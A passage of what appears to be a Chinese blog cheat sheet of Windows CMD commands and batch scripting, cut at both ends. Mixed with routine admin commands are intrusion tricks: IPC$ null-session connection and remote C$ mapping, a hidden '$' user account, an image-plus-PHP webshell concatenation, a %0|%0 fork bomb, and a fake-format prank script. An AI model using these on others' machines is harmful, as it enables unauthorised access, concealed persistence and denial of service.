mask=mask)：设置本地ip</span><br><span class="line"><span class="built_in">set</span> address name=&quot;本地连接&quot; gateway=ip gwmetric=<span class="number">1</span>：设置网关</span><br><span class="line"></span><br><span class="line">dump：显示配置脚本</span><br><span class="line">netsh dump &gt; <span class="built_in">path</span>：导出配置到<span class="built_in">path</span>中</span><br><span class="line"></span><br><span class="line">netsh winsock reset：重置Winsock目录（重新初始化网络环境，解决软件冲突、病毒原因造成的参数错误）</span><br><span class="line">netsh int ip reset c:\resetlog.txt：重置TCP/IP协议，相当于重装TCP/IP协议，恢复到初次安装操作系统时的状态</span><br></pre></td></tr></table></figure></li><li><p>防火墙配置</p><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">firewall：简单配置</span><br><span class="line">advfirewall：高级配置</span><br><span class="line"></span><br><span class="line">例子：</span><br><span class="line">操作防火墙：netsh firewall <span class="built_in">set</span> opmode <span class="built_in">mode</span>=disable / enable（关闭 / 打开）</span><br><span class="line">开启端口：netsh firewall <span class="built_in">set</span> portopening TCP <span class="number">3389</span> ENABLE</span><br><span class="line">关闭端口：netsh firewall delete portopening TCP <span class="number">3389</span></span><br><span class="line">开启端口：netsh advfirewall firewall add rule name=baidujingyan <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=<span class="number">3389</span></span><br><span class="line">关闭端口：netsh advfirewall firewall delete rule name=baidujingyan <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=<span class="number">3389</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span>：<span class="keyword">in</span> / out（进站 / 出站）</span><br><span class="line">action：allow / disallow（允许 / 不允许）</span><br></pre></td></tr></table></figure></li><li><p>wifi配置</p><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">netsh wlan show profiles：连接过的wifi</span><br><span class="line">netsh wlan show profiles name=&quot;name&quot; key=clear：查看wifi详细信息</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-7-arp"><a href="#4-7-arp" class="headerlink" title="4.7 arp"></a>4.7 arp</h4><blockquote><p>查询arp记录</p></blockquote><ul><li>/a：查询arp</li><li>/s IP  mac：修改路由表</li></ul><h4 id="4-8-nsloopup"><a href="#4-8-nsloopup" class="headerlink" title="4.8 nsloopup"></a>4.8 nsloopup</h4><blockquote><p>查询DNS记录</p></blockquote><h4 id="4-9-tracert"><a href="#4-9-tracert" class="headerlink" title="4.9 tracert"></a>4.9 tracert</h4><blockquote><p>追踪网络</p><p><code>tracert + ip/域名</code>：测试网络</p></blockquote><h3 id="5-文件"><a href="#5-文件" class="headerlink" title="5 文件"></a>5 文件</h3><h4 id="5-1-start"><a href="#5-1-start" class="headerlink" title="5.1  start"></a>5.1  start</h4><blockquote><p><code>start + 路径/网址</code>：打开</p><p>带空格打开带 <code>&quot; &quot;</code> </p><p>例：<code>start &quot;C:\Program Files (x86)\Baidu&quot;</code></p></blockquote><ul><li>/min：最小化打开</li><li>/max：最大化打开（默认）</li></ul><h4 id="5-2-call"><a href="#5-2-call" class="headerlink" title="5.2 call"></a>5.2 call</h4><blockquote><p>程序互相调用</p><p><code>call + 路径</code>：调用</p><p>调用完后会回到原来的程序。</p></blockquote><h4 id="5-3-sort"><a href="#5-3-sort" class="headerlink" title="5.3 sort"></a>5.3 sort</h4><blockquote><p>排序</p><p><code>sort + 路径</code>：对文件内容排序（按ASCII码顺序）</p></blockquote><ul><li>/+n：从第n个字符开始排序</li><li>/r：升序变降序</li><li>/o + 路径：重定向输出</li></ul><h4 id="5-4-创建"><a href="#5-4-创建" class="headerlink" title="5.4 创建"></a>5.4 创建</h4><blockquote><p><a href="https://www.iteye.com/blog/zhangjiankun880-962489">创建隐藏文件夹</a></p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"># 创建文件</span><br><span class="line"><span class="built_in">cd</span>. &gt; a.txt</span><br><span class="line"># 创建文件夹</span><br><span class="line"><span class="built_in">md</span> <span class="built_in">path</span></span><br><span class="line"></span><br><span class="line"># 创建无法打开的文件夹</span><br><span class="line"><span class="built_in">md</span> e:\news..\</span><br></pre></td></tr></table></figure><h4 id="5-5-删除"><a href="#5-5-删除" class="headerlink" title="5.5 删除"></a>5.5 删除</h4><blockquote><p><code>rd + path</code>：删除文件夹</p><p><code>del + path</code>：删除文件</p></blockquote><ul><li>/f：强制删除只读文件</li><li>/s：删除所有子目录中的指定的文件</li><li>/q：安静模式。删除全局通配符时，不要求确认</li></ul><h4 id="5-6-ren"><a href="#5-6-ren" class="headerlink" title="5.6 ren"></a>5.6 ren</h4><blockquote><p>重命名文件</p><p><code>ren old new</code>：重命名</p></blockquote><h4 id="5-7-move"><a href="#5-7-move" class="headerlink" title="5.7 move"></a>5.7 move</h4><blockquote><p>移动文件</p><p><code>move old new</code>：移动</p></blockquote><h4 id="5-8-attrib"><a href="#5-8-attrib" class="headerlink" title="5.8 attrib"></a>5.8 attrib</h4><blockquote><p>更改文件属性</p><p><code>attrib</code>：操作文件</p></blockquote><ul><li>+h：隐藏文件</li><li>-h：显示文件</li></ul><h4 id="5-9-cd"><a href="#5-9-cd" class="headerlink" title="5.9 cd"></a>5.9 cd</h4><blockquote><p> 切换路径</p><p>切换盘： 直接盘名+： 例如：<code>D:</code></p><p>切换路径 ：<code>cd + 路径</code></p></blockquote><h3 id="6-内容"><a href="#6-内容" class="headerlink" title="6 内容"></a>6 内容</h3><h4 id="6-1-set"><a href="#6-1-set" class="headerlink" title="6.1 set"></a>6.1 set</h4><blockquote><p>显示、设置、删除 cmd.exe环境变量</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"># 显示环境变量</span><br><span class="line"><span class="built_in">set</span></span><br><span class="line"># 显示环境变量name</span><br><span class="line"><span class="built_in">set</span> name：</span><br><span class="line"># 设置环境变量name值为xxx</span><br><span class="line"><span class="built_in">set</span> name=xxx</span><br><span class="line"># 设置值为空（等于删除环境变量）</span><br><span class="line"><span class="built_in">set</span> name=</span><br><span class="line"># 直接运算表达式的值（值可以赋给变量）</span><br><span class="line"><span class="built_in">set</span> /a &lt;expr&gt;</span><br><span class="line"># 输入赋值（值可以赋给变量）</span><br><span class="line"><span class="built_in">set</span> /p &lt;expr&gt;</span><br><span class="line"></span><br><span class="line"># 赋值案例</span><br><span class="line"><span class="built_in">set</span> /a var=<span class="number">4</span>*<span class="number">5</span></span><br><span class="line"><span class="built_in">set</span> /p var=请输入数字</span><br></pre></td></tr></table></figure><h4 id="6-2-copy"><a href="#6-2-copy" class="headerlink" title="6.2 copy"></a>6.2 copy</h4><blockquote><p>拼接文件</p><p><a href="https://www.iteye.com/blog/ongsh-875066">copy</a></p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">COPY</span>[/D][/V][/N][/Y | /-Y][/Z][/A | /B ]source[/A |/B][+ source [/A | /B][+ ...]][destination[/A|/B]]</span><br><span class="line"># source 指定要复制的文件。</span><br><span class="line">/A # 表示一个 ASCII 文本文件。</span><br><span class="line">/B # 表示一个二进位文件。</span><br><span class="line">/D # 允许解密要创建的目标文件</span><br><span class="line"># destinaton 为新文件指定目录和/或文件名。</span><br><span class="line">/V # 验证新文件写入是否正确。</span><br><span class="line">/N # 复制带有非 <span class="number">8</span>dot3 名称的文件时，尽可能使用短文件名。</span><br><span class="line">/Y # 不使用确认是否要改写现有目标文件的提示。</span><br><span class="line">/-Y # 使用确认是否要改写现有目标文件的提示。</span><br><span class="line">/Z # 用可重新启动模式复制已联网的文件。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 案例</span><br><span class="line"><span class="built_in">copy</span> <span class="number">111</span>.jpg /b + a.txt /a test.php</span><br></pre></td></tr></table></figure><h4 id="6-3-type"><a href="#6-3-type" class="headerlink" title="6.3 type"></a>6.3 type</h4><blockquote><p>查看文件内容</p><p><code>type [drive:][path]filename</code>：显示内容</p></blockquote><h4 id="6-4-find"><a href="#6-4-find" class="headerlink" title="6.4 find"></a>6.4 find</h4><blockquote><p>查找字符串（编码必须是ANSI）</p><p><code>find &quot;str&quot;</code></p><p><code>findstr str</code></p></blockquote><h4 id="6-5-时间管理"><a href="#6-5-时间管理" class="headerlink" title="6.5 时间管理"></a>6.5 时间管理</h4><blockquote><p><code>date</code>：修改日期</p><p><code>time</code>：修改时间</p></blockquote><ul><li>/t：只读</li></ul><h4 id="6-6-tree"><a href="#6-6-tree" class="headerlink" title="6.6 tree"></a>6.6 tree</h4><blockquote><p>树形查看文件列表</p><p>tree：以图形显示驱动器或路径的文件夹结构。</p><p><code>TREE [drive:][path][/F][/A]</code></p></blockquote><ul><li>/f：显示每个文件夹中文件的名称。</li><li>/a：使用 ASCII 字符，而不使用扩展字符。</li></ul><h4 id="6-7-dir"><a href="#6-7-dir" class="headerlink" title="6.7 dir"></a>6.7 dir</h4><blockquote><p>查看当前目录文件</p><p>dir：查看文件</p></blockquote><ul><li>/a：详细查看全部类型文件（可以选择具体只查看哪种文件）<br>​</li></ul><h4 id="6-8-systeminfo"><a href="#6-8-systeminfo" class="headerlink" title="6.8 systeminfo"></a>6.8 systeminfo</h4><blockquote><p>systeminfo：获得设备运行状况</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"># 远程获得（system：ip地址，user：主机名，password：密码）</span><br><span class="line">systeminfo /S system /U domain\user /P password</span><br></pre></td></tr></table></figure><h4 id="6-9-whoami"><a href="#6-9-whoami" class="headerlink" title="6.9 whoami"></a>6.9 whoami</h4><blockquote><p>whoami：查询用户信息</p></blockquote><ul><li>/user：显示用户的SID</li></ul><h3 id="7-管理"><a href="#7-管理" class="headerlink" title="7 管理"></a>7 管理</h3><h4 id="7-1-磁盘管理"><a href="#7-1-磁盘管理" class="headerlink" title="7.1 磁盘管理"></a>7.1 磁盘管理</h4><h5 id="7-1-1-convert"><a href="#7-1-1-convert" class="headerlink" title="7.1.1 convert"></a>7.1.1 convert</h5><blockquote><p>转化卷</p><p>将 FAT 卷转换为 NTFS。</p></blockquote><h5 id="7-1-2-diskpart"><a href="#7-1-2-diskpart" class="headerlink" title="7.1.2 diskpart"></a>7.1.2 diskpart</h5><blockquote><p>磁盘管理</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">dispart：进入磁盘管理模式</span><br><span class="line"></span><br><span class="line">list disk：列出磁盘</span><br><span class="line">select disk n：选定第n块磁盘</span><br><span class="line">creat partition primary：创建主分区</span><br><span class="line"><span class="built_in">format</span> <span class="built_in">fs</span>=ntfs quick <span class="built_in">label</span>=&quot;E:&quot;：定义磁盘</span><br><span class="line">detail disk：显示磁盘分区</span><br><span class="line">select partition n：选择第n磁盘分区</span><br><span class="line">clean：格式化磁盘</span><br><span class="line"><span class="keyword">exit</span>：退出</span><br></pre></td></tr></table></figure><h5 id="7-1-3-sfc"><a href="#7-1-3-sfc" class="headerlink" title="7.1.3 sfc"></a>7.1.3 sfc</h5><blockquote><p>修复系统文件（admin下执行）</p><p>扫描所有保护的系统文件的完整性，并使用正确的 Microsoft 版本替换不正确的版本。</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">sfc：扫描</span><br><span class="line"></span><br><span class="line">/scannow：扫描并修复</span><br><span class="line">/verifyonly：扫描不修复</span><br><span class="line">或者指定文件</span><br></pre></td></tr></table></figure><h5 id="7-1-4-chkdsk"><a href="#7-1-4-chkdsk" class="headerlink" title="7.1.4 chkdsk"></a>7.1.4 chkdsk</h5><blockquote><p>检查磁盘</p><p>检查磁盘并显示状态报告。</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">chkdsk</span> [+磁盘名]：检查磁盘（不输入名字是全部磁盘）</span><br><span class="line"></span><br><span class="line">/f：修复</span><br><span class="line">/s：查找坏扇区并修复可读文件</span><br></pre></td></tr></table></figure><h4 id="7-2-net管理"><a href="#7-2-net管理" class="headerlink" title="7.2 net管理"></a>7.2 net管理</h4><h5 id="7-2-1-net-user"><a href="#7-2-1-net-user" class="headerlink" title="7.2.1 net user"></a>7.2.1 net user</h5><blockquote><p>用户管理</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> user [ name ]：查看用户</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> user name [ passwd ]：对name用户进行操作</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> user administrator passwd：（PowerShell打开）修改管理员密码</span><br><span class="line">/add：添加用户（需要密码）</span><br><span class="line">/<span class="built_in">del</span>：删除用户</span><br><span class="line">/active:no：禁用账户</span><br><span class="line">/active:yes：启用账户</span><br><span class="line">/Expires：设置账户过期时间（例：/Expires:nov,<span class="number">4</span>,<span class="number">2018</span>）</span><br><span class="line">/times：设置使用时段（例：/times:M-F,<span class="number">8</span>:<span class="number">00</span>-<span class="number">22</span>:<span class="number">00</span>;Sa-Su,<span class="number">19</span>:<span class="number">00</span>-<span class="number">21</span>:<span class="number">00</span>）</span><br><span class="line"><span class="built_in">net</span> user name$ passwd /add：设置隐藏账户</span><br></pre></td></tr></table></figure><h5 id="7-2-2-net-localgroup"><a href="#7-2-2-net-localgroup" class="headerlink" title="7.2.2 net localgroup"></a>7.2.2 net localgroup</h5><blockquote><p>本地组管理</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> localgroup [name]：查看组</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> localgroup [group] [user]：对用户在组中操作</span><br><span class="line">/add：加入组</span><br><span class="line">/<span class="built_in">del</span>：离开组</span><br></pre></td></tr></table></figure><h5 id="7-2-3-net-share-分享管理"><a href="#7-2-3-net-share-分享管理" class="headerlink" title="7.2.3 net share    分享管理"></a>7.2.3 net share    分享管理</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> share：查看共享</span><br><span class="line"><span class="built_in">net</span> view + hostname：查看指定主机的共享</span><br><span class="line"></span><br><span class="line"><span class="built_in">net</span> share name=<span class="built_in">path</span>：设置共享路径，共享名（name + $：默认共享）</span><br><span class="line"><span class="built_in">net</span> share name /<span class="built_in">del</span>：取消共享</span><br></pre></td></tr></table></figure><h5 id="7-2-4-net-stat-服务管理"><a href="#7-2-4-net-stat-服务管理" class="headerlink" title="7.2.4 net stat    服务管理"></a>7.2.4 net stat    服务管理</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> stat + service：开启服务</span><br><span class="line"><span class="built_in">net</span> stop + service：关闭服务</span><br></pre></td></tr></table></figure><h5 id="7-2-5-net-use"><a href="#7-2-5-net-use" class="headerlink" title="7.2.5 net use"></a>7.2.5 net use</h5><blockquote><p>IPC$弱连接入侵</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">net</span> use：查看记录的新的网络连接</span><br><span class="line"><span class="built_in">net</span> use \\IP\ipc$ &quot;&quot; /user:&quot;&quot;：建立空连接</span><br><span class="line"><span class="built_in">net</span> use \\IP\ipc$ &quot;username&quot; /user:&quot;passwd&quot;：建立非空连接</span><br><span class="line"><span class="built_in">net</span> use z: \\IP\c$ &quot;passwd&quot; /user:&quot;username&quot;：将对方C盘映射到本地Z盘</span><br><span class="line"><span class="built_in">net</span> use z: \\IP\c$：已经和目标建立了ipc$，则可以直接用IP+盘符+$访问</span><br><span class="line"><span class="built_in">net</span> use \\IP\ipc$ /<span class="built_in">del</span>：删除一个ipc$连接</span><br><span class="line"><span class="built_in">net</span> use c: /<span class="built_in">del</span>：删除共享映射c盘</span><br></pre></td></tr></table></figure><h4 id="7-3-进程管理"><a href="#7-3-进程管理" class="headerlink" title="7.3 进程管理"></a>7.3 进程管理</h4><blockquote><p><a href="https://zhidao.baidu.com/question/574634746.html"> &lt;其他&gt;参考连接</a></p></blockquote><h5 id="7-3-1-tasklist"><a href="#7-3-1-tasklist" class="headerlink" title="7.3.1 tasklist"></a>7.3.1 tasklist</h5><blockquote><p>显示进程</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">tasklist：查看运行中的进程</span><br><span class="line"></span><br><span class="line">tasklist | <span class="built_in">findstr</span> pid ：查看指定pid的进程信息</span><br></pre></td></tr></table></figure><h5 id="7-3-2-taskkill"><a href="#7-3-2-taskkill" class="headerlink" title="7.3.2 taskkill"></a>7.3.2 taskkill</h5><blockquote><p>杀死进程</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">taskkill</span> /pid xxx -f ：杀死进程（依照pid）</span><br><span class="line"><span class="built_in">taskkill</span> /im name /f ：杀死进程（依照名字）</span><br></pre></td></tr></table></figure><h5 id="7-3-3-计划任务"><a href="#7-3-3-计划任务" class="headerlink" title="7.3.3 计划任务"></a>7.3.3 计划任务</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">（已弃用）<span class="built_in">at</span>：查看计划任务</span><br><span class="line"><span class="built_in">at</span> <span class="built_in">time</span> &quot;exe&quot;：新加计划任务</span><br><span class="line"><span class="built_in">at</span> id /delete：删除计划任务</span><br><span class="line"></span><br><span class="line">schtasks.exe：查看计划任务</span><br></pre></td></tr></table></figure><h4 id="7-4-系统管理"><a href="#7-4-系统管理" class="headerlink" title="7.4 系统管理"></a>7.4 系统管理</h4><h5 id="7-4-1-runas"><a href="#7-4-1-runas" class="headerlink" title="7.4.1 runas"></a>7.4.1 runas</h5><blockquote><p>临时提权</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">开启许可：secpol.msc——本地策略——安全选项——账户：管理员账户状态——开启</span><br><span class="line"></span><br><span class="line">runas /noprofile /user:mymachine\administrator <span class="built_in">cmd</span>：临时管理员打开<span class="built_in">CMD</span>（mymachine：主机名）</span><br><span class="line">runas /user:mymachine\administrator /sa &quot;<span class="built_in">path</span>&quot;：临时管理员打开程序</span><br></pre></td></tr></table></figure><h5 id="7-4-2-shutdown"><a href="#7-4-2-shutdown" class="headerlink" title="7.4.2 shutdown"></a>7.4.2 shutdown</h5><blockquote><p>关机</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">shutdown：关机</span><br><span class="line"></span><br><span class="line">/i：图形化界面</span><br><span class="line">/s：关机</span><br><span class="line">/p：关机，无警告</span><br><span class="line">/r：重启</span><br><span class="line">/l：注销</span><br><span class="line">/a：终止关机</span><br><span class="line">/t <span class="built_in">time</span>：多少秒后关机</span><br></pre></td></tr></table></figure><h5 id="7-4-3-slmgr"><a href="#7-4-3-slmgr" class="headerlink" title="7.4.3 slmgr"></a>7.4.3 slmgr</h5><blockquote><p>激活操作系统</p><p>查看操作系统信息或激活操作系统。</p></blockquote><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">slmgr：帮助</span><br><span class="line"></span><br><span class="line">/xpr：到期时间</span><br><span class="line">/dli：详细信息</span><br><span class="line">/upk：卸载密钥</span><br><span class="line">/ipk + n：安装密钥</span><br><span class="line">/skms name：设置密钥管理服务计算机名</span><br><span class="line">/ato：成功激活产品</span><br></pre></td></tr></table></figure><h5 id="7-4-4-注册表管理"><a href="#7-4-4-注册表管理" class="headerlink" title="7.4.4 注册表管理"></a>7.4.4 注册表管理</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">regedit：注册表编辑器</span><br><span class="line">HKEY_CURRENT_USER：当前用户</span><br><span class="line">HKEY_LOCAL_MACHINE：当前机器</span><br><span class="line"></span><br><span class="line">reg：操作注册表</span><br><span class="line">增删改查 </span><br><span class="line"></span><br><span class="line">备份：reg export &quot;key&quot; file.reg</span><br><span class="line">导出：file.reg / reg import file.reg</span><br></pre></td></tr></table></figure><h5 id="7-4-5-启动管理器"><a href="#7-4-5-启动管理器" class="headerlink" title="7.4.5 启动管理器"></a>7.4.5 启动管理器</h5><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">winver：win版本</span><br><span class="line">taskmgr：任务管理器</span><br><span class="line">compmgmt：计算机管理</span><br><span class="line">lusrmgr.msc：用户管理</span><br><span class="line">services.msc：服务管理</span><br><span class="line">firewall.cpl：防火墙管理</span><br><span class="line">gpedit.msc：本地组策略管理</span><br><span class="line">secpol.msc：本地安全策略</span><br><span class="line">regedit：注册表编辑器</span><br><span class="line">eventvwr.msc ：日志查看器</span><br><span class="line">control：控制面板</span><br></pre></td></tr></table></figure><hr><h2 id="三、Bat脚本"><a href="#三、Bat脚本" class="headerlink" title="三、Bat脚本"></a>三、Bat脚本</h2><h3 id="1-回显"><a href="#1-回显" class="headerlink" title="1 回显"></a>1 回显</h3><blockquote><p><code>@echo off</code>与<code>@echo on</code> 前者为关闭回显，后者为打开回显<br>当不想批处理文件中的命令一行一行在DOS中显示出来时（因为全部显示出来的话看起来会变得很杂乱），可以使用@echo off，将其放于程序的最上方就行了。</p></blockquote><h3 id="2-交互"><a href="#2-交互" class="headerlink" title="2 交互"></a>2 交互</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">输入：<span class="built_in">set</span> /p expr：输入赋值（值可以赋给变量） </span><br><span class="line"></span><br><span class="line">输出：<span class="built_in">echo</span> + 语句</span><br><span class="line">语句：提示语句 </span><br><span class="line"><span class="variable">%variable%</span>：显示变量值</span><br><span class="line"></span><br><span class="line">例：<span class="built_in">echo</span> you input:<span class="variable">%var%</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">换行：</span><br><span class="line"><span class="built_in">echo</span>=</span><br><span class="line"><span class="built_in">echo</span>, </span><br><span class="line"><span class="built_in">echo</span>; </span><br><span class="line"><span class="built_in">echo</span>+ </span><br><span class="line"><span class="built_in">echo</span>/ </span><br><span class="line"><span class="built_in">echo</span>[ </span><br><span class="line"><span class="built_in">echo</span>] </span><br><span class="line"><span class="function">echo: </span></span><br><span class="line"><span class="function"><span class="title">echo</span>. </span></span><br><span class="line"><span class="function"><span class="title">echo</span>\ </span></span><br><span class="line"><span class="function">效率依次递减</span></span><br></pre></td></tr></table></figure><h3 id="3-功能"><a href="#3-功能" class="headerlink" title="3 功能"></a>3 功能</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="comment">rem 或 :: （双冒号）：注释</span></span><br><span class="line"><span class="built_in">cls</span>：清屏</span><br><span class="line"><span class="built_in">pause</span>：暂停</span><br><span class="line"><span class="keyword">exit</span>：退出</span><br></pre></td></tr></table></figure><h3 id="4-占位符"><a href="#4-占位符" class="headerlink" title="4 占位符"></a>4 占位符</h3><blockquote><p>%1 %2：第一个输入参数，第二个输入参数</p></blockquote><h3 id="5-goto-跳转"><a href="#5-goto-跳转" class="headerlink" title="5 goto    跳转"></a>5 goto    跳转</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">:<span class="built_in">label</span>：标签</span><br><span class="line"><span class="function">goto label：跳转到标签处</span></span><br></pre></td></tr></table></figure><h3 id="6-重定向"><a href="#6-重定向" class="headerlink" title="6 重定向"></a>6 重定向</h3><ul><li><p>>：输出重定向（覆盖原记录）</p><blockquote><p>例：pause &gt; nul</p><p>di&gt;right.txt</p><p>2&gt;error.txt</p></blockquote></li><li><p>>&gt;：追加输出重定向（追加原记录）</p></li><li><p>&lt;：输入重定向</p></li><li><p>句柄数字：</p><ol><li>键盘输入</li><li>输出到命令提示符窗口</li><li>错误输出</li></ol></li></ul><h3 id="7-特殊字符"><a href="#7-特殊字符" class="headerlink" title="7 特殊字符"></a>7 特殊字符</h3><div class="table-container"><table><thead><tr><th>字符</th><th>作用</th></tr></thead><tbody><tr><td>&#124;</td><td>第一条命令结果作为第二条命令的参数</td></tr><tr><td>&amp;</td><td>无论第一条命令是否成功都会执行后面的命令</td></tr><tr><td>&amp;&amp;</td><td>第一条命令成功了才会执行第二条命令</td></tr><tr><td>&#124;&#124;</td><td>第一条命令失败了才会执行第二条命令</td></tr><tr><td>()</td><td>将命令括起（不常用）</td></tr><tr><td>;</td><td>分隔命令或分隔命令参数（不常用）</td></tr></tbody></table></div><ul><li>案例<ul><li>类似 if else：<code>dir &amp;&amp; echo success || echo failed</code></li></ul></li></ul><h3 id="8-出错码"><a href="#8-出错码" class="headerlink" title="8 出错码"></a>8 出错码</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="variable">%errorlevel%</span>：输出错误码</span><br><span class="line"><span class="keyword">errorlevel</span>：查询上一条命令执行的错误码，<span class="number">0</span>为执行成功</span><br></pre></td></tr></table></figure><h3 id="9-判断"><a href="#9-判断" class="headerlink" title="9 判断"></a>9 判断</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> a ( b ) <span class="keyword">else</span> ( c )：a条件，bc结果</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">exist</span> a ( b ) <span class="keyword">else</span> ( c )：a条件，bc结果</span><br></pre></td></tr></table></figure><h3 id="10-循环"><a href="#10-循环" class="headerlink" title="10 循环"></a>10 循环</h3><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FOR</span> %variable <span class="keyword">IN</span> (<span class="built_in">set</span>) <span class="keyword">DO</span> command [command-parameters]</span><br><span class="line"></span><br><span class="line">查找后缀为txt的文件</span><br><span class="line"><span class="keyword">for</span> /r <span class="built_in">path</span> %i <span class="keyword">in</span> (*.txt) <span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">%i（脚本中为%</span>%i）</span><br></pre></td></tr></table></figure><h3 id="11-bat封装成exe"><a href="#11-bat封装成exe" class="headerlink" title="11 bat封装成exe"></a>11 bat封装成exe</h3><blockquote><p><a href="https://www.sogou.com/link?url=hedJjaC291OfPyaFZYFLI4KQWvqt63NBNzAlF3XC1dH29RGaQ0phGA..">bat转exe</a></p></blockquote><ul><li><p>winrar</p><blockquote><p>压缩——后缀改为exe——自解压选项——设置——提取后运行——bat的path</p><p>path例子：./新建文件夹/1.bat</p></blockquote></li><li><p>BatToExe：转化器</p></li></ul><h3 id="12-Bat脚本实例"><a href="#12-Bat脚本实例" class="headerlink" title="12 Bat脚本实例"></a>12 Bat脚本实例</h3><h4 id="12-1-死循环"><a href="#12-1-死循环" class="headerlink" title="12.1 死循环"></a>12.1 死循环</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line"><span class="variable">%0：再次打开一次自己</span></span><br><span class="line"><span class="variable"></span></span><br><span class="line"><span class="variable">%</span><span class="number">0</span> | %<span class="number">0</span></span><br><span class="line">不断地自我重建，并占用所有的CPU资源。</span><br></pre></td></tr></table></figure><h4 id="12-2-伪格式化"><a href="#12-2-伪格式化" class="headerlink" title="12.2 伪格式化"></a>12.2 伪格式化</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">chcp</span> <span class="number">65001</span> &gt; <span class="built_in">nul</span></span><br><span class="line"><span class="built_in">Color</span> <span class="number">4</span>A</span><br><span class="line"><span class="built_in">Title</span> 系统损坏器</span><br><span class="line"><span class="built_in">echo</span> <span class="number">1</span> &gt; <span class="built_in">nul</span></span><br><span class="line"><span class="built_in">echo</span> 正在卸载所有软件~~~~~</span><br><span class="line"><span class="built_in">echo</span> 正在格式化C盘 <span class="built_in">format</span> c:\</span><br><span class="line"><span class="built_in">echo</span> 正在格式化D、E、F、G和接入的可移动储存设备 <span class="built_in">format</span> d:\ e:\ f:\ g:\</span><br><span class="line"><span class="built_in">echo</span> 正在删除所有文件~~~~~</span><br><span class="line"><span class="built_in">echo</span> 系统发生严重错误!</span><br><span class="line"><span class="built_in">echo</span> :(</span><br><span class="line"><span class="built_in">taskkill</span> /f /im explorer.exe &gt; <span class="built_in">nul</span></span><br><span class="line"><span class="built_in">echo</span> <span class="number">15</span>秒后电脑将恢复正常，千万别关闭界面，否则......</span><br><span class="line"><span class="built_in">ping</span> <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> -n <span class="number">15</span> &gt; <span class="built_in">nul</span></span><br><span class="line"><span class="built_in">start</span> c:\windows\explorer.exe</span><br><span class="line"><span class="built_in">echo</span> 哈哈哈哈哈哈哈哈哈</span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><h4 id="12-3-浏览器"><a href="#12-3-浏览器" class="headerlink" title="12.3 浏览器"></a>12.3 浏览器</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">chcp</span> <span class="number">65001</span></span><br><span class="line"><span class="built_in">set</span> /p var=&quot;请输入搜索：&quot;</span><br><span class="line"><span class="built_in">start</span> https://www.sogou.com/sie?query=<span class="variable">%var%</span></span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><h4 id="12-4-找文件"><a href="#12-4-找文件" class="headerlink" title="12.4 找文件"></a>12.4 找文件</h4><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">tip：文件要是ANSI编码保存</span><br><span class="line"></span><br><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">title</span> <span class="number">2</span>.txt</span><br><span class="line"><span class="built_in">set</span> space= </span><br><span class="line">:<span class="built_in">start</span></span><br><span class="line"><span class="built_in">set</span> /p var=input name:</span><br><span class="line"><span class="built_in">echo</span> have</span><br><span class="line"><span class="built_in">type</span> <span class="number">2</span>.txt</span><br><span class="line"><span class="built_in">echo</span>=</span><br><span class="line"><span class="built_in">echo</span> choose</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%var%</span></span><br><span class="line"><span class="built_in">type</span> <span class="number">2</span>.txt | <span class="built_in">findstr</span> <span class="variable">%var%</span></span><br><span class="line"><span class="keyword">if</span> <span class="variable">%var%</span>==<span class="keyword">exit</span> (<span class="keyword">goto</span> end) <span class="keyword">else</span> (<span class="keyword">goto</span> <span 